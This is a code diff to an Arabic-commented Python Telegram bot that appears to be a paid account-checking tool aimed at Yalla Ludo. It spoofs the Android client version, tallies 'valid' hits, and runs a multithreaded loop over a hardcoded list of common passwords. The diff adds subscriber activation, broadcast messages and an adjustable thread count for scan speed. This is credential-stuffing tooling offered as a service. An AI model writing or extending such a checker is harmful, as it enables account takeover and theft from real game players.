@@ -1,3 +1,7 @@
+#!/usr/bin/env python3
+# -*- coding: utf-8 -*-
+# © Q_b_h — Telegram Bot Control Version
+
 import base64
 import hashlib
 import hmac
@@ -25,7 +29,7 @@ ADMIN_ID = 8795120325  # آيدي المطور الوحيد المخول بال�
 
 bot = telebot.TeleBot(TG_TOKEN)
 
-# متغيرات التحكم بحالة الفحص
+# متغيرات التحكم بحالة الفحص والسرعة
 is_running = False
 check_thread = None
 stop_event = threading.Event()
@@ -33,9 +37,11 @@ stats_lock = threading.Lock()
 valid_count = 0
 wrong_count = 0
 error_count = 0
+scan_threads = 10  # عدد الثريدز الافتراضي لسرعة الفحص
 
-# قاموس لتتبع حالات الأدمن (تفعيل/حذف مشترك)
-user_states = {}
+# تخزين بيانات المشتركين وحالات الأدمن
+subscribers: Set[int] = set()
+user_states: Dict[int, str] = {}
 
 VER    = "YallaLudo-1.4.9.2-(Build 1040922)-Android 30"
 VERH   = "1.4.9.2"
@@ -395,23 +401,27 @@ def get_control_keyboard(running: bool):
     else:
         markup.add(types.InlineKeyboardButton("⏹ إيقاف الفحص", callback_data="stop_check"))
     
-    # أزرار إدارة المشتركين المضافة
+    # أزرار إدارة المشتركين، الإذاعة، وتغيير السرعة (الثريدز) المضافة
     markup.add(
         types.InlineKeyboardButton("➕ تفعيل مشترك", callback_data="add_subscriber"),
-        types.InlineKeyboardButton("➖ حذف مشترك", callback_data="del_subscriber")
+        types.InlineKeyboardButton("➖ حذف مشترك", callback_data="del_subscriber"),
+        types.InlineKeyboardButton("📋 عرض المشتركين", callback_data="list_subscribers"),
+        types.InlineKeyboardButton("📢 إذاعة إلى المشتركين", callback_data="broadcast_msg"),
+        types.InlineKeyboardButton(f"⚙️ سرعة الفحص (الثريدز): {scan_threads}", callback_data="set_threads")
     )
     return markup
 
-@bot.message_handler(commands=['start'])
-def send_welcome(message):
+@bot.message_handler(commands=['admin'])
+def admin_command(message):
     if message.from_user.id != ADMIN_ID:
-        bot.reply_to(message, "❌ عذراً، هذا البوت مخصص للمطور فقط.")
+        bot.reply_to(message, "❌ عذراً، هذا الأمر مخصص للمطور فقط.")
         return
     
     text = (
-        "🎛 <b>لوحة تحكم فاحص Yalla Ludo</b>\n\n"
-        "حالة الفحص حالياً: <b>متوقف 🛑</b>\n"
-        "اضغط على الزر أدناه لبدء عملية الفحص التلقائي أو إدارة المشتركين:"
+        "🎛 <b>لوحة تحكم المطور</b>\n\n"
+        f"حالة الفحص حالياً: <b>{'يعمل 🚀' if is_running else 'متوقف 🛑'}</b>\n"
+        f"سرعة الفحص الحالية: <b>{scan_threads} ثريد</b>\n\n"
+        "اختر أحد خيارات الإدارة أدناه:"
     )
     bot.send_message(message.chat.id, text, parse_mode="HTML", reply_markup=get_control_keyboard(is_running))
 
@@ -462,13 +472,13 @@ def callback_handler(call):
         bot.answer_callback_query(call.id, "⏹ تم إيقاف الفحص")
         
         main_text = (
-            "🎛 <b>لوحة تحكم فاحص Yalla Ludo</b>\n\n"
+            "🎛 <b>لوحة تحكم المطور</b>\n\n"
             "حالة الفحص حالياً: <b>متوقف 🛑</b>\n\n"
             f"📊 <b>ملخص النتائج النهائية:</b>\n"
             f"✅ صيد (Valid): {valid_count}\n"
             f"❌ خطأ (Wrong): {wrong_count}\n"
             f"⚠️ أخطاء اتصال (Errors): {error_count}\n\n"
-            "اضغط على الزر أدناه لبدء فحص جديد:"
+            "اختر أحد الخيارات أدناه:"
         )
         bot.edit_message_text(
             main_text,
@@ -478,24 +488,90 @@ def callback_handler(call):
             reply_markup=get_control_keyboard(False)
         )
 
-    elif call.data in ["add_subscriber", "del_subscriber"]:
-        user_states[call.from_user.id] = call.data
+    elif call.data == "add_subscriber":
+        user_states[call.from_user.id] = "add_subscriber"
         bot.answer_callback_query(call.id)
         bot.send_message(call.message.chat.id, "ارسل ايدي الشخص المراد تفعيلة و عدد الايام او تفعيل بساعات")
 
-# معالج استقبال الرسائل النصية الخاصة بالأدمن عند اختيار تفعيل أو حذف مشترك
+    elif call.data == "del_subscriber":
+        user_states[call.from_user.id] = "del_subscriber"
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, "ارسل ايدي الشخص المراد حذفه من المشتركين:")
+
+    elif call.data == "list_subscribers":
+        bot.answer_callback_query(call.id)
+        if not subscribers:
+            bot.send_message(call.message.chat.id, "📋 لا يوجد مشتركين مسجلين حالياً.")
+        else:
+            subs_text = "📋 <b>قائمة المشتركين:</b>\n\n" + "\n".join([f"• <code>{sub}</code>" for sub in subscribers])
+            bot.send_message(call.message.chat.id, subs_text, parse_mode="HTML")
+
+    elif call.data == "broadcast_msg":
+        user_states[call.from_user.id] = "broadcast"
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, "📢 ارسل رسالة الإذاعة المراد إرسالها لجميع المشتركين:")
+
+    elif call.data == "set_threads":
+        user_states[call.from_user.id] = "set_threads"
+        bot.answer_callback_query(call.id)
+        bot.send_message(call.message.chat.id, f"⚙️ السرعة الحالية: <code>{scan_threads}</code> ثريد.\n\nأرسل عدد الثريدز الجديد (رقم صحيح بين 1 و 100):", parse_mode="HTML")
+
+# معالج الردود النصية الخاصة بلوحة المشتركين، الإذاعة، وتعديل الثريدز للأدمن
 @bot.message_handler(func=lambda message: message.from_user.id == ADMIN_ID and message.from_user.id in user_states)
 def handle_admin_input(message):
+    global scan_threads
     action = user_states.pop(message.from_user.id, None)
+    
     if action == "add_subscriber":
-        bot.reply_to(message, f"✅ تم استلام طلب تفعيل المشترك:\n<code>{message.text}</code>", parse_mode="HTML")
+        text = message.text.strip()
+        parts = text.split()
+        if parts and parts[0].isdigit():
+            sub_id = int(parts[0])
+            subscribers.add(sub_id)
+            bot.reply_to(message, f"✅ تم تفعيل المشترك بنجاح:\n<code>{text}</code>", parse_mode="HTML")
+        else:
+            bot.reply_to(message, "❌ الآيدي المدخل غير صحيح. يرجى إرسال الآيدي والتفاصيل بشكل صحيح.")
+
     elif action == "del_subscriber":
-        bot.reply_to(message, f"🗑 تم استلام طلب حذف المشترك:\n<code>{message.text}</code>", parse_mode="HTML")
+        text = message.text.strip()
+        if text.isdigit():
+            sub_id = int(text)
+            if sub_id in subscribers:
+                subscribers.remove(sub_id)
+                bot.reply_to(message, f"🗑 تم حذف المشترك <code>{sub_id}</code> بنجاح.", parse_mode="HTML")
+            else:
+                bot.reply_to(message, "⚠️ هذا الآيدي غير موجود في قائمة المشتركين.")
+        else:
+            bot.reply_to(message, "❌ يرجى إرسال آيدي صحيح بالأرقام للحذف.")
+
+    elif action == "broadcast":
+        msg_text = message.text
+        success = 0
+        failed = 0
+        for sub_id in subscribers:
+            try:
+                bot.send_message(sub_id, f"📢 <b>إذاعة جديدة:</b>\n\n{msg_text}", parse_mode="HTML")
+                success += 1
+            except Exception:
+                failed += 1
+        bot.reply_to(message, f"📢 <b>تم الانتهاء من الإذاعة:</b>\n✅ تم الإرسال بنجاح إلى: {success}\n❌ فشل الإرسال إلى: {failed}", parse_mode="HTML")
+
+    elif action == "set_threads":
+        text = message.text.strip()
+        if text.isdigit():
+            val = int(text)
+            if 1 <= val <= 100:
+                scan_threads = val
+                bot.reply_to(message, f"⚙️ تم تحديث سرعة الفحص (الثريدز) بنجاح إلى: <code>{scan_threads}</code>", parse_mode="HTML")
+            else:
+                bot.reply_to(message, "⚠️ يرجى إدخال رقم بين 1 و 100.")
+        else:
+            bot.reply_to(message, "❌ يرجى إرسال رقم صحيح فقط.")
 
 def run_checker_loop(chat_id, msg_id):
     global valid_count, wrong_count, error_count, is_running
     
-    max_threads = 10
+    max_threads = scan_threads  # استخدام الثريدز المحددة من قبل المطور
     passwords = [
     'Aa123123123',
     'Aa12312300',
